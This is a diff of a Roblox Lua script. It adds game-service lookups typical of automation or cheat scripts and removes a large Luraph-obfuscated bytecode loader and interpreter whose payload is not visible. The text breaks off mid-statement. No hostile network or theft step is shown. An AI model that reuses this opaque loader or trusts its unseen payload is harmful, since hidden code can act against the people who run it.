@@ -1,3 +1,432 @@
--- This file was protected using Luraph Obfuscator v14.5.1 [https://lura.ph/]
+local v_getservice = game.GetService
+local VirtualUser = v_getservice(game, "VirtualUser")
+local Players = v_getservice(game, "Players")
+local TeleportService = v_getservice(game, "TeleportService")
+local HttpService = v_getservice(game, "HttpService")
+local CoreGui = v_getservice(game, "CoreGui")
+local RunService = v_getservice(game, "RunService")
+local TweenService = v_getservice(game, "TweenService")
+local UserInputService = v_getservice(game, "UserInputService")
+local ReplicatedStorage = v_getservice(game, "ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
 
-return(function(a,a,a,a,a,a,b,c,d,e,f,g,h,i,j,k,l,l,l,m,m,m,m,m,m,n,n,n,n,n,n,n,n)local o,p,q,r,s,t,u,v,w,x,y,z,ba,bb,bc,bd,be,bf,bg,bh,bi,bj,bk,bl,bm,bn,bo,bp,bq,br,bs,bt,bu,bv,bw,bx,by,bz local ca={}local cb={}cb[1]=0 cb[2]=0 cb[3]=2 local cc=37201 local cd=0 repeat if cc<=37201 then if cc<=-27044 then if cc<=-43406 then if cc>=-47391 then if cc>=-43875 then if cc==-43875 then bb=rawset bc=setfenv cc=-24589 else w=nil v=p and p[(function(bc,ce)local cf={}for cg=1,#bc do local bc=d(bc,cg)cf[cg]=n(c(37,99),(bc-(ce+cg))%256)end return h(cf)end)("\142\150\140\142\140\155",33)]or function(bc,ce)if ce<0 then return w(bc,-ce)end return(bc*2^ce)%q;end w=p and p[(function(bc,ce)local cf={}for cg=1,#bc do local bc=d(bc,cg)cf[cg]=n(c(37,99),(bc-(ce+cg))%256)end return h(cf)end)("\165\167\157\159\157\172",50)]or function(bc,ce)if ce<0 then return v(bc,-ce)end return i(bc%q/2^ce)end cc=36364 end else bv=function(bc,...)local ce=j('#',...);for cf=1,ce do bc[cf]=j(cf,...);end;local cf=bc[0]or 0 if cf>ce then for cg=ce+1,cf do bc[cg]=nil;end;end;bc[0]=ce;return ce;end cb[3]=(cb[3]+1)%5 cd,cc=32150,32150 end else if cc<-48630 then bs=function(bc)local ce=bq(bc)local bc=bq(bc)if bc==0 then return ce;elseif(bc>=2147483648)then bc=bc-4294967296;end;return bc*4294967296+ce;end cb[3]=(cb[3]+1)%5 cd,cc=-48630,-48630 else bt=nil cc=-23026 end end else if cc<=-41855 then if cc>=-41982 then if cc<-41855 then s=function(bc,ce,cf)local cg=cf-ce+1 if cg>7997 then return r(bc,ce,cf)else return l(bc,ce,cf)end end cd,cc=71103,71103 else bi=nil cd,cc=81347,81347 end else r=function(l,bc,ce)if(bc>ce)then return end local cf=ce-bc+1 do local cg=0 local ch=0 if ch==0 and cf>=8 then cg=78845 ch=1 end if ch==0 and cf>=7 then cg=26533 ch=1 end if ch==0 and cf>=6 then cg=57063 ch=1 end if ch==0 and cf>=5 then cg=80327 ch=1 end if ch==0 and cf>=4 then cg=38740 ch=1 end if ch==0 and cf>=3 then cg=76134 ch=1 end if ch==0 and cf>=2 then cg=68927 ch=1 end if ch==0 then cg=95879 ch=1 end if cg==78845 then return l[bc],l[bc+1],l[bc+2],l[bc+3],l[bc+4],l[bc+5],l[bc+6],l[bc+7],r(l,bc+8,ce)end if cg==26533 then return l[bc],l[bc+1],l[bc+2],l[bc+3],l[bc+4],l[bc+5],l[bc+6],r(l,bc+7,ce)end if cg==57063 then return l[bc],l[bc+1],l[bc+2],l[bc+3],l[bc+4],l[bc+5],r(l,bc+6,ce)end if cg==80327 then return l[bc],l[bc+1],l[bc+2],l[bc+3],l[bc+4],r(l,bc+5,ce)end if cg==38740 then return l[bc],l[bc+1],l[bc+2],l[bc+3],r(l,bc+4,ce)end if cg==76134 then return l[bc],l[bc+1],l[bc+2],r(l,bc+3,ce)end if cg==68927 then return l[bc],l[bc+1],r(l,bc+2,ce)end if cg==95879 then return l[bc],r(l,bc+1,ce)end end end cc=-41982 end else if cc>=-31489 then if cc~=-27044 then bh=function(l)local r=0 local bc=0 for ce=0,3 do local cf=d(l,bg)r=u(r,v(cf,8*ce));bg=bg+1;end;for ce=0,3 do local l=d(l,bg)bc=u(bc,v(l,8*ce));bg=bg+1;end;return bc*4294967296+r;end cc=-41855 else bn=nil cc=42835 end else break end end end else if cc>=-12024 then if cc<=27108 then if cc<=-12024 then bl=nil cd=cb[1]==0 and-27044 or 41741 cc=41741 else if cc<=22709 then bu=function(...)return{...},j('#',...)end cc=-47391 else bm=nil cd,cc=78384,78384 end end else if cc>=36364 then if cc~=37201 then x=p and p[(function(l,r)local bc={}for ce=1,#l do local l=d(l,ce)bc[ce]=n(c(37,99),(l-(r+ce))%256)end return h(bc)end)("\205\205\219\210",106)]or function(l,r)local bc=0 local ce=1 while l>0 and r>0 do local cf=l%2 local cg=r%2 if cf==1 and cg==1 then bc=bc+ce;end;l=i(l/2);r=i(r/2);ce=ce*2;end;return bc;end y=p and p[(function(l,r)local bc={}for ce=1,#l do local l=d(l,ce)bc[ce]=n(c(37,99),(l-(r+ce))%256)end return h(bc)end)("\110\123\125\131",11)]or function(l)l=l%q return(q-1)-l end z=(table.create or function(l)return{s({},1,l)};end)ba=ca[829]cd,cc=-43875,-43875 else ca[829]={}cc=83715 end else bw=ca[830]cd,cc=59683,59683 end end else if cc>=-20982 then if cc>=-19716 then if cc==-19716 then be=function(l)local r,y,ba,bc=nil,nil,nil,nil local bw={}for ce=0,255 do bw[ce]=c(ce);end;local function ce(cf)local cg=-1 local ch=256 local ci=257 local cj=258 local ck=259 local cl=260 local cm=#cf local cn=1 local co=0 local cp=0 local function cq(cr)while cp<cr and cn<=cm do local cf=d(cf,cn)cn=cn+1;co=co+v(cf,cp);cp=cp+8;end;end;local function cf()if cp==0 then cq(1);end;local cm=x(co,1)co=w(co,1);cp=cp-1;return cm;end;local function cm(cn)if cn<=0 then return 0;end;cq(cn);local cq=v(1,cn)-1 local cq=x(co,cq)co=w(co,cn);cp=cp-cn;return cq;end;local function cn()local co=0 while cf()==0 do co=co+1;if co>31 then break;end;end;if co==0 then return 1;end;local cp=1 for cq=1,co do cp=cp*2+cf();end;return cp;end;local function co(cp)local cq=0 while cf()==0 do cq=cq+1;end;if cp==0 then return cq;end;local cr=cm(cp)return cq*(2^cp)+cr;end;local function cp(cq)local cr={}local function cs(ct,cu,cv)local cw=cr for cx=cu-1,0,-1 do local ct=x(w(ct,cx),1)if not cw[ct]then cw[ct]={};end;cw=cw[ct];end;cw[cg]=cv;end;local ct=cn()-1 if ct<=0 then return cr;end;local cu=0 local cv={}local cw=-1 local cx=0 for cy=1,ct do local ct if cq then if cy==1 then ct=cm(8);else local cq=cn()ct=cw+cq;end;else local cq=cn()if cy==1 then ct=cq-1;else ct=cw+cq;end;end;local cq if cy==1 then cq=cn();else local cy=cf()if cy==1 then cq=cx;else cq=cn();end;end;if cq>cu then cu=cq;end;local cn=cv[cq]if cn==nil then cn={};cv[cq]=cn;end;cn[#cn+1]=ct;cw=ct;cx=cq;end;local cn=0 local cq=0 for ct=1,cu do local cu=cv[ct]if cu~=nil then m(cu);if ct>cq then cn=v(cn,ct-cq);cq=ct;end;for m=1,#cu do cs(cn,ct,cu[m]);cn=cn+1;end;end;end;return cr;end;local function m(cn)local cn=cn while true do local cq=cf()cn=cn[cq];if not cn then return;end;local cg=cn[cg]if cg~=nil then return cg;end;end;end;local cg=cp(false)local cn=cp(false)local cq=cp(false)local cr=cp(true)local cp=cp(true)local cs=cm(2)local ct,cu,cv,cw if cs==0 then ct=r or 0;cu=y or 0;cv=ba or 0;cw=bc or 0;elseif cs==1 then local cs={[-1]=0,[0]=1,[1]=2,[2]=3}local cs={[0]=-1,[1]=0,[2]=1,[3]=2}local cx=cs[cm(2)]local cy=cs[cm(2)]local cz=cs[cm(2)]local cs=cs[cm(2)]ct=(r or 0)+cx;cu=(y or 0)+cy;cv=(ba or 0)+cz;cw=(bc or 0)+cs;r,y,ba,bc=ct,cu,cv,cw;else ct=cm(4);cu=cm(4);cv=cm(4);cw=cm(4);r,y,ba,bc=ct,cu,cv,cw;end;local r={}local y=0 local ba=false local bc=false while true do local cg=bc and cq or(ba and cn or cg)local cg=m(cg)if cg==nil then break;end;if cg==cl then break;end;if cg==ch then local ch=ba and cp or cr local ch=m(ch)if ch==nil then break;end;local cl=cf()local cl=co(cl==0 and cv or cw)+1 local cn=bw[ch]y=y+1;r[y]=g(cn,cl);ba=(ch==0);bc=true;elseif cg==ci then local cf=cf()local cf=co(cf==0 and ct or cu)+1 local ch=bw[0]y=y+1;r[y]=g(ch,cf);ba=true;bc=true;elseif cg==cj then local cf=2+cm(5)local ch=bw[0]y=y+1;r[y]=g(ch,cf);ba=true;bc=true;elseif cg==ck then local cf=ba and cp or cr local m=m(cf)if m==nil then break;end;local cf=2+cm(3)local ch=bw[m]y=y+1;r[y]=g(ch,cf);ba=(m==0);bc=true;else y=y+1;r[y]=bw[cg];ba=(cg==0);bc=false;end;end;return h(r);end;local function g(m)local r={}local y=256 local ba={}for bc=1,y do ba[bc]={};for y=0,255 do ba[bc][y+1]=y;end;end;local y=0 local bc=#m for cf=1,bc do local bc=y+1 local ba=ba[bc]local m=d(m,cf)+1 local bc=ba[m]r[cf]=bw[bc];if m>1 then o(ba,1,m-1,2);ba[1]=bc;end;y=bc;end;return h(r);end;local function m(r,y)local ba=#r if ba==0 then return"";end;y=y+1;local bc={}if ba>0 then bc[ba]=0;bc[ba]=nil;end;local cf={}local cg={}cg[256]=0;cg[256]=nil;for ch=1,ba do local ch=d(r,ch)cf[ch]=(cf[ch]or 0)+1;end;local ch=1 for ci=0,255 do local cf=cf[ci]or 0 cg[ci]=ch;ch=ch+cf;end;for cf=1,ba do local ch=d(r,cf)local ci=cg[ch]bc[ci]=cf;cg[ch]=ci+1;end;local cf={}if ba>0 then cf[ba]="";cf[ba]=nil;end;local y=y for cg=1,ba do y=bc[y];cf[cg]=bw[d(r,y)];end;return h(cf);end;local l=bd(l)local r={}local y=0 local ba=1 local bc=#l while ba+7<=bc do local bw,cf,cg,ch=d(l,ba,ba+3)local bw=bw+cf*256+cg*65536+ch*16777216 ba=ba+4;local cf,cg,ch,ci=d(l,ba,ba+3)local cf=cf+cg*256+ch*65536+ci*16777216 ba=ba+4;if ba+cf-1>bc then break;end;local l=a(l,ba,ba+cf-1)ba=ba+cf;local l=ce(l)local g=g(l)local g=m(g,bw)y=y+1;r[y]=g;end;return h(r);end cd=cb[1]~=1 and-31489 or 87607 cb[3]=(cb[3]+1)%5 cc=87607 else bo=function(g)local l=0 local m=1 repeat local g=d(g,bg,bg)l=l+(g>127 and g-128 or g)*m m=m*128 bg=bg+1 until(g<128)return l end cd,cc=50453,50453 end else by=bt(bf)bz=bx(by,{},k())return bz();end else if cc<=-24589 then bd=function(g)local k=33 local l=85 local m={}local r=#g local y=1 local ba=1 while y<=r do local bc=y+4 local r=(bc<=r)and 5 or(r-y+1)if r==0 then break;end;local g,bc,bw,by,bz=d(g,y,bc)if r<5 then bc=bc or 117;bw=bw or 117;by=by or 117;bz=bz or 117;end;if(g<k or g>=k+l)then return"";end;if r>=2 and(bc<k or bc>=k+l)then return"";end;if r>=3 and(bw<k or bw>=k+l)then return"";end;if r>=4 and(by<k or by>=k+l)then return"";end;if r>=5 and(bz<k or bz>=k+l)then return"";end;local g=((((g-k)*l+(bc-k))*l+(bw-k))*l+(by-k))*l+(bz-k)local k=x(w(g,24),255)local l=x(w(g,16),255)local w=x(w(g,8),255)local g=x(g,255)local g=c(k,l,w,g)if r<5 then g=a(g,1,r-1);end;m[ba]=g;ba=ba+1;y=y+5;end;return h(m);end cd,cc=-19716,-19716 else bt=function(g)local k k={[4339]={},[1648]={},[310]={},[172]={},[618]={},[5455]={},[1803]={},}local l l={}bb(l,(function(m)local r=0 while true do if m<=-31637 then do if m>=-34462 then do local w=(m~=-31637)if w then m=m-697 r=r+1 else m=m+753 r=r+1 end end else if m<-35159 then m=m+11018 r=r+1 else m=m+48351 r=r+1 end end end else if(12033)>=(m)then do local w=(m~=12033)if w then do m=m+30887 r=r+1 end else m=m-43670 r=r+1 end end else if(13192)==(m)then m=m+34906 do r=r+1 end else m=m-36065 r=r+1 end end end if not((r)~=(8))then break end end return m end)(-45480),bm(g))do l[(function(m)local r=0 while true do do if m<=-22716 then if(-73615)>=(m)then m=m+46320 r=r+1 else if m<-22716 then m=m+27885 do r=r+1 end else m=m+22725 do r=r+1 end end end else if m<=590 then m=m+34801 r=r+1 else do if m<=23449 then m=m-46165 r=r+1 else m=m-11942 r=r+1 end end end end if(6)==(r)then break end end end return m end)(-73615)]=bm(g);bb(l,(function(m)local r=0 do repeat if not(true)then break end do if m<=-34447 then if(-45534)==(m)then m=m+34274 r=r+1 else m=m+22931 r=r+1 end else if m~=-11260 then m=m-34018 r=r+1 else m=m+11266 do r=r+1 end end end do local r=(r==4)if r then break end end end until false end return m end)(-34447),bm(g))end l[(function(m)local r=0 while true do do if m<=-6051 then do if m<=-16920 then m=m+49112 r=r+1 else do local w=(m<=-14153)if w then do m=m+21386 r=r+1 end else do m=m+6062 r=r+1 end end end end end else if(7233)<=(m)then do local w=(m==7233)if w then m=m-13284 r=r+1 else m=m-33758 r=r+1 end end else do m=m-12587 r=r+1 end end end if r==6 then do break end end end end return m end)(-16920)]=bm(g);do l[(function(m)local r r=0 repeat if not(true)then break end do if m<=12377 then if m>=6680 then do if m==6680 then m=m+5697 r=r+1 else m=m-12369 r=r+1 end end else if m==-5640 then m=m+5692 r=r+1 else m=m+6628 r=r+1 end end else if not((m)>(27073))then if m<=15583 then m=m-21223 r=r+1 else m=m+30209 r=r+1 end else if(28082)>=(m)then m=m-1009 r=r+1 else if m<=57282 then m=m+5316 r=r+1 else m=m-47015 r=r+1 end end end end end if r==9 then break end until false return m end)(28082)]=bm(g);end do l[(function(m)local r r=0 do while true do if m>=-32230 then if not((m)<(-20797))then if m>=-10621 then if m==-10621 then m=m+10635 r=r+1 else do m=m-36581 end do r=r+1 end end else m=m-13994 r=r+1 end else do local w=(m~=-29318)if w then do m=m-10574 r=r+1 end else m=m+23281 r=r+1 end end end else do if m<=-42618 then do if m~=-42618 then m=m+739 r=r+1 else m=m+31997 do r=r+1 end end end else do local w=(m<=-42065)if w then do m=m+12747 r=r+1 end else do m=m+2561 end r=r+1 end end end end end if r==9 then break end end end return m end)(-20797)]=bm(g);end do l[(function(m)local r=0 repeat if not(true)then break end do if m>=-111436 then if m<=-107822 then do do local w=(not((m)~=(-111436)))if w then m=m-41607 r=r+1 else do m=m+28398 end do r=r+1 end end end end else if m<=-79424 then m=m+38448 r=r+1 else do m=m+40989 end r=r+1 end end else if m>=-124146 then if not((m)>(-124146))then do m=m+16324 end do r=r+1 end else m=m+3881 r=r+1 end else m=m+28897 r=r+1 end end end do if r==7 then break end end until false return m end)(-115317)]=bm(g);l[(function(m)local r=0 while true do if m<=1937 then if m<=-27607 then m=m+29544 r=r+1 else if(1937)>(m)then do m=m-11599 r=r+1 end else m=m+25023 r=r+1 end end else if m<=26574 then if m<=22139 then do m=m+21047 r=r+1 end else do m=m-4435 end r=r+1 end else if m<43186 then m=m-386 r=r+1 else m=m-43176 r=r+1 end end end if r==7 then break end end do return m end end)(-16008)]=bm(g);end do bb(l,(function(m)local r=0 while true do do if not((m)>(22241))then do local w=((302)>=(m))if w then m=m+29199 do r=r+1 end else m=m-21939 r=r+1 end end else if m==29501 then m=m-29499 r=r+1 else m=m-42359 r=r+1 end end if r==4 then break end end end return m end)(64600),bm(g))end l[(function(m)local r=0 while true do if m<=-13427 then do local w=(m<=-51947)if w then m=m+39923 r=r+1 else if m~=-13427 then m=m-32097 r=r+1 else m=m+49678 r=r+1 end end end else if m<=-12024 then m=m+12029 r=r+1 else if m<=-1106 then do m=m-18744 r=r+1 end else m=m-37357 r=r+1 end end end do local r=(r==6)if r then break end end end return m end)(-13427)]=bm(g);do l[(function(m)local r=0 while true do do if m>=46584 then if m~=57524 then do m=m-8884 r=r+1 end else do m=m-10940 end r=r+1 end else if m~=41582 then m=m-37696 r=r+1 else m=m+15942 r=r+1 end end if r==4 then break end end end return m end)(41582)]=bm(g);l[(function(m)local r=0 while true do do if not((m)<(75119))then if(76522)>=(m)then if m~=76522 then m=m-6715 r=r+1 else m=m+22562 r=r+1 end else do local w=(m<=99084)if w then m=m+17096 do r=r+1 end else m=m-41061 r=r+1 end end end else if m<=17969 then if m<=-2970 then m=m+20939 r=r+1 else m=m-17962 r=r+1 end else if m==19497 then m=m-22467 r=r+1 else m=m-48907 r=r+1 end end end end do local r=(r==8)if r then break end end end return m end)(76522)]=bm(g);end l[(function(m)local r r=0 while true do if m<=-49888 then if m<=-75700 then do local w=(m<=-79200)if w then do m=m+17438 r=r+1 end else m=m-3500 r=r+1 end end else do local w=(m~=-49888)if w then m=m+45068 r=r+1 else m=m-25812 r=r+1 end end end else do if m<=-30898 then if m<-30898 then m=m+14460 r=r+1 else do m=m-18990 r=r+1 end end else if(-25688)>=(m)then m=m+25689 r=r+1 else m=m-23454 r=r+1 end end end end if not((r)~=(8))then break end end return m end)(-30898)]=bm(g);bb(l,(function(m)local r=0 do while true do do if(-52174)>=(m)then do local w=(m>=-62036)if w then do local w=(m==-62036)if w then do m=m+9862 end r=r+1 else m=m-10113 r=r+1 end end else if(-62287)~=(m)then m=m+21305 r=r+1 else m=m-101 r=r+1 end end end else if m>=3763 then if m>=34990 then if m==34990 then m=m+8818 r=r+1 else m=m-43796 r=r+1 end else do m=m+31227 r=r+1 end end else do do local w=(m<-35535)if w then m=m+44846 do r=r+1 end else m=m-26501 r=r+1 end end end end end end if not(not(r==9))then break end end return m end end)(-35535),bm(g))bb(k,3798,l)local m=bo(g)local r={}local w,x,y,ba=0,0,0,0 local bc=l[(function(bc)local bd=0 while true do if bc<=-31637 then if bc>=-34462 then if bc~=-31637 then bc=bc-697 bd=bd+1 else bc=bc+753 bd=bd+1 end else if bc<-35159 then bc=bc+11018 bd=bd+1 else bc=bc+48351 bd=bd+1 end end else if bc<=12033 then if bc~=12033 then bc=bc+30887 bd=bd+1 else bc=bc-43670 bd=bd+1 end else if bc==13192 then bc=bc+34906 bd=bd+1 else bc=bc-36065 bd=bd+1 end end end if bd==8 then break end end return bc end)(-45480)]local bd=l[(function(bd)local bw=0 while true do if bd<=22241 then if bd<=302 then bd=bd+29199 bw=bw+1 else bd=bd-21939 bw=bw+1 end else if bd==29501 then bd=bd-29499 bw=bw+1 else bd=bd-42359 bw=bw+1 end end if bw==4 then break end end return bd end)(64600)]local bw bw=l[(function(by)local bz=0 while true do if by<=-6051 then if by<=-16920 then by=by+49112 bz=bz+1 else if by<=-14153 then by=by+21386 bz=bz+1 else by=by+6062 bz=bz+1 end end else if by>=7233 then if by==7233 then by=by-13284 bz=bz+1 else by=by-33758 bz=bz+1 end else by=by-12587 bz=bz+1 end end if bz==6 then break end end return by end)(-16920)]local by=l[(function(by)local bz=0 while true do if by>=-111436 then if by<=-107822 then if by==-111436 then by=by-41607 bz=bz+1 else by=by+28398 bz=bz+1 end else if by<=-79424 then by=by+38448 bz=bz+1 else by=by+40989 bz=bz+1 end end else if by>=-124146 then if by<=-124146 then by=by+16324 bz=bz+1 else by=by+3881 bz=bz+1 end else by=by+28897 bz=bz+1 end end if bz==7 then break end end return by end)(-115317)]local bz=l[(function(bz)local ce=0 while true do if bz<=12377 then if bz>=6680 then if bz==6680 then bz=bz+5697 ce=ce+1 else bz=bz-12369 ce=ce+1 end else if bz==-5640 then bz=bz+5692 ce=ce+1 else bz=bz+6628 ce=ce+1 end end else if bz<=27073 then if bz<=15583 then bz=bz-21223 ce=ce+1 else bz=bz+30209 ce=ce+1 end else if bz<=28082 then bz=bz-1009 ce=ce+1 else if bz<=57282 then bz=bz+5316 ce=ce+1 else bz=bz-47015 ce=ce+1 end end end end if ce==9 then break end end return bz end)(28082)]for ce=1,m do local m={}m[bz]=bo(g);local bz bz=(bm(g))~=0 local cf cf=not((bm(g))~=(1))local cg=bm(g)==1 local ch=bm(g)if ch==1 then local ci=br(g)local cj cj={}local ck={}local cl={}local cm,cn,co=0,0,0 for cp=1,ci do cn=cn+bp(g);do co=co+bp(g);end do cm=cm+bp(g);end ck[cp]=cn;bb(cl,cp,co)do cj[cp]=cm;end end;do m[bc]=cj;bb(m,bd,ck)end m[bw]=cl;elseif not((ch)~=(2))then local ci=br(g)local cj={}local ck ck={}local cl,cm=0,0 for cn=1,ci do cm=cm+bp(g);do cl=cl+bp(g);ck[cn]=cm;end do cj[cn]=cl;end end;m[bc]=cj;m[bd]=ck;elseif not((ch)~=(3))then local ci ci=br(g)local cj={}local ck=0 for cl=1,ci do ck=ck+bp(g);bb(cj,cl,ck)end;m[bc]=cj;elseif ch==4 then local ch=br(g)local ci={}local cj={}local ck={}local cl={}local cm,cn,co,cp cm,cn,co,cp=0,0,0,0 for cq=1,ch do cn=cn+bp(g);co=co+bp(g);cm=cm+bp(g);cp=cp+bp(g);bb(cj,cq,cn)do ck[cq]=co;end do ci[cq]=cm;cl[cq]=cp;end end;m[bc]=ci;do m[bd]=cj;end m[bw]=ck;bb(m,by,cl)else x=x+bp(g);do y=y+bp(g);end w=w+bp(g);do ba=ba+bp(g);end m[bd]=x;bb(m,bw,y)bb(m,bc,w)bb(m,by,ba)end bb(m,l[(function(w)local x=0 while true do if w<=-52174 then if w>=-62036 then if w==-62036 then w=w+9862 x=x+1 else w=w-10113 x=x+1 end else if w~=-62287 then w=w+21305 x=x+1 else w=w-101 x=x+1 end end else if w>=3763 then if w>=34990 then if w==34990 then w=w+8818 x=x+1 else w=w-43796 x=x+1 end else w=w+31227 x=x+1 end else if w<-35535 then w=w+44846 x=x+1 else w=w-26501 x=x+1 end end end if x==9 then break end end return w end)(-35535)],bz)m[l[(function(w)local x=0 while true do if w<=-22716 then if w<=-73615 then w=w+46320 x=x+1 else if w<-22716 then w=w+27885 x=x+1 else w=w+22725 x=x+1 end end else if w<=590 then w=w+34801 x=x+1 else if w<=23449 then w=w-46165 x=x+1 else w=w-11942 x=x+1 end end end if x==6 then break end end return w end)(-73615)]]=cf;m[l[(function(w)local x=0 while true do if w>=75119 then if w<=76522 then if w~=76522 then w=w-6715 x=x+1 else w=w+22562 x=x+1 end else if w<=99084 then w=w+17096 x=x+1 else w=w-41061 x=x+1 end end else if w<=17969 then if w<=-2970 then w=w+20939 x=x+1 else w=w-17962 x=x+1 end else if w==19497 then w=w-22467 x=x+1 else w=w-48907 x=x+1 end end end if x==8 then break end end return w end)(76522)]]=cg;do m[l[(function(l)local w=0 while true do if l>=46584 then if l~=57524 then l=l-8884 w=w+1 else l=l-10940 w=w+1 end else if l~=41582 then l=l-37696 w=w+1 else l=l+15942 w=w+1 end end if w==4 then break end end return l end)(41582)]]=r[ce-1];end r[ce]=m;end;k[4339]=r;bb(k,310,bm(g))bb(k,618,(bm(g))~=0)local l=bm(g)~=0 if l then local l l=bo(g)local m={}local r=0 do for w=1,l do local l=bm(g)~=0 local w w=l and 1 or 0 local l=bp(g)local l=r+l r=l b(m,{w,l})end bb(k,1803,m)end end;local l=bo(g)local m={}local r=0 do do local w=(1)local x=(1)local l=(l)if x>=0 then while w<=l do local y=(0)~=(bm(g))local y=y and 1 or 0 local ba=bp(g)local ba=r+ba r=ba local bc=bm(g)do b(m,{y,ba,bc})end w=w+x end else while w>=l do local l=(0)~=(bm(g))local l=l and 1 or 0 local y=bp(g)local y=r+y r=y local r=bm(g)do b(m,{l,y,r})end w=w+x end end end end do k[5455]=m end do k[2367]=bo(g);end for b=1,bo(g)do bb(k[172],b,bt(g))end;local b=bo(g)local l l={}for m=1,b do local b={}local r=bo(g)for w=1,r do b[w]=bo(g);end;bb(l,m,b)end;k[4044]=l;local b b=bo(g)local l l={}for m=1,b do local b b=bm(g)if b==0 then local r r=bm(g)if r==0 then local r=bo(g)local w do local x=(r==0)if x then w="";else w=a(g,bg,bg+r-1);end end bg=bg+r;l[m]=w;end;elseif(1)==(b)then local a=bm(g)do local a=(a==1)if a then l[m]=bp(g);else do bb(l,m,bs(g))end end end elseif b==2 then local a=bm(g)do if(1)==(a)then bb(l,m,bo(g))else l[m]=bh(g);end;end elseif(3)==(b)then l[m]=bn(g);elseif b==4 then local a=bm(g)if not((a)~=(1))then bb(l,m,bp(g))else l[m]=bn(g);end;elseif b==5 then l[m]=(1)==(bm(g));else l[m]=nil;end;end;do k[1648]=l;end return k;end cd=cb[1]~=0 and 59683 or 22709 cd,cc=22709,22709 end end end end else if cc<=70976 then if cc<=43086 then if cc<=42086 then if cc~=42086 then bl=function(a)local b=0 b=u(b,v(d(a,bg,bg),8));bg=bg+1;return b;end cb[2]=(cb[2]+1)%5 cd,cc=27108,27108 else ca[828]=table and table.move or function(a,b,g,k,l)l=l or a;k=k+g;for m=g,b,-1 do k=k-1;l[k]=a[m];end;return l;end cb[2]=(cb[2]+1)%5 cd,cc=42231,42231 end else if cc<=42231 then o=ca[828]p=bit32 or bit q=2^32 cb[3]=(cb[3]+1)%5 cd,cc=-43350,-43350 else if cc<43086 then bn=function(a)local a,b,g,k,l,m,o,q=d(a,bg,bg+7)bg=bg+8;local r=q>127 and-1 or 1 local q=(q%128)*16+i(o/16)local a=((o%16)*2^48+m*2^40+l*2^32+k*2^24+g*2^16+b*2^8+a)if q==0 then if a==0 then return r*0;else return r*a*2^(-1022-52);end;elseif q==2047 then if a==0 then return r*(1/0);else return 0/0;end;end;a=a+2^52;return r*a*2^(q-1023-52);end cd,cc=82175,82175 else bq=nil cd=cb[3]~=1 and 70976 or 86361 cc=86361 end end end else if cc>=59683 then if cc>=60392 then if cc~=70976 then bk=nil cc=58181 else br=nil cb[1]=(cb[1]+1)%5 cd,cc=88254,88254 end else bx=function(a,b,g,...)local k=(a[4339])local l=a[310]local m=a[618]local m=a[172]local o=a[1648]local q=a[4044]local r=a[3798]local r,w,x,y,ba=r[(function(w)local x=0 while true do if w<=-31637 then if w>=-34462 then if w~=-31637 then w=w-697 x=x+1 else w=w+753 x=x+1 end else if w<-35159 then w=w+11018 x=x+1 else w=w+48351 x=x+1 end end else if w<=12033 then if w~=12033 then w=w+30887 x=x+1 else w=w-43670 x=x+1 end else if w==13192 then w=w+34906 x=x+1 else w=w-36065 x=x+1 end end end if x==8 then break end end return w end)(-45480)],r[(function(w)local x=0 while true do if w<=12377 then if w>=6680 then if w==6680 then w=w+5697 x=x+1 else w=w-12369 x=x+1 end else if w==-5640 then w=w+5692 x=x+1 else w=w+6628 x=x+1 end end else if w<=27073 then if w<=15583 then w=w-21223 x=x+1 else w=w+30209 x=x+1 end else if w<=28082 then w=w-1009 x=x+1 else if w<=57282 then w=w+5316 x=x+1 else w=w-47015 x=x+1 end end end end if x==9 then break end end return w end)(28082)],r[(function(w)local x=0 while true do if w>=-111436 then if w<=-107822 then if w==-111436 then w=w-41607 x=x+1 else w=w+28398 x=x+1 end else if w<=-79424 then w=w+38448 x=x+1 else w=w+40989 x=x+1 end end else if w>=-124146 then if w<=-124146 then w=w+16324 x=x+1 else w=w+3881 x=x+1 end else w=w+28897 x=x+1 end end if x==7 then break end end return w end)(-115317)],r[(function(w)local x=0 while true do if w<=-6051 then if w<=-16920 then w=w+49112 x=x+1 else if w<=-14153 then w=w+21386 x=x+1 else w=w+6062 x=x+1 end end else if w>=7233 then if w==7233 then w=w-13284 x=x+1 else w=w-33758 x=x+1 end else w=w-12587 x=x+1 end end if x==6 then break end end return w end)(-16920)],r[(function(r)local w=0 while true do if r<=22241 then if r<=302 then r=r+29199 w=w+1 else r=r-21939 w=w+1 end else if r==29501 then r=r-29499 w=w+1 else r=r-42359 w=w+1 end end if w==4 then break end end return r end)(64600)]return function(...)local a=z(a[2367])local z={}local bb={}local bc={}local bd=0 local bl=0 local bn={}local bt=0 local j=j('#',...)local bw=l+1 local bu,bw=bu(...);local bw={...};local bw=1 local by=-1 for bz=1,j do if bz-1<=l then a[bz]=bu[bz];end;end;local j,l while true do j=k[bw];l=j[w];if l<=(0+(5))then if not((l)>(1))then if(0)>=(l)then local w=j[r]local w=a[w]bd=bd+((1)*1)bc[bd]=w else a[j[r]]=o[j[ba]];end else if(((4)*1))<=(l)then if l<=4 then a[j[r]][a[j[ba]]]=a[j[y]];else local w=j[ba]local w=o[w]bd=((0+(1)))+(bd)bc[bd]=w end else if l<3 then a[j[r]]=g[o[j[ba]]];else a[j[r]]=a[j[ba]][a[j[y]]];end end end else if l<=17 then if l<=10 then if l<=8 then if l<=(0+(7))then if l<7 then bw=j[ba];else local w=#j[r]for bu=1,w do a[j[r][bu]]=o[j[ba][bu]];end;end else local w=j[r]local bu=j[ba]local w=a[w]bw=((not w)and(bu)or bw)end else if not((l)==(10))then local w,bu=j[r],j[ba]local bu=a[bu]a[w]=bu[1]else a[j[r]]=b[j[ba]]end end else if l>=15 then if not((l)>(16))then if l~=((16)+0)then local w=j[r]for bu=1,#w do local w=a[w[bu]]bd=(1)+(bd)bc[bd]=w end else local w,bu=a[j[ba]],j[r]a[bu+1]=w;a[bu]=w[a[j[y]]];end else local w=j[ba]for bu=1,#w do local w=w[bu]local w=o[w]bd=bd+1 bc[bd]=w end end else if l>=13 then if l==((13)*1)then local w=j[ba]local w=b[w]a[j[r]]=w[1]else do return end end else if not((l)==(12))then local w=j[r]local bu=bc[bd]bc[bd]=nil bd=bd-1 local bz=bc[bd]bc[bd]=nil bd=bd-1 a[w]=bz(bu)else local w=j[r]local bu=bc[bd]bc[bd]=nil bd=bd-((1)-0)local bz=bc[bd]bc[bd]=nil bd=bd-1 local ce=bc[bd]bc[bd]=nil bd=bd-1 a[w]=ce(bz,bu)end end end end else if l>=28 then if l<=35 then if l<=((31)+0)then if l>=30 then if not((l)>=(31))then a[j[r]]=a[j[ba]]..a[j[y]];else do return a[j[r]]end end else if 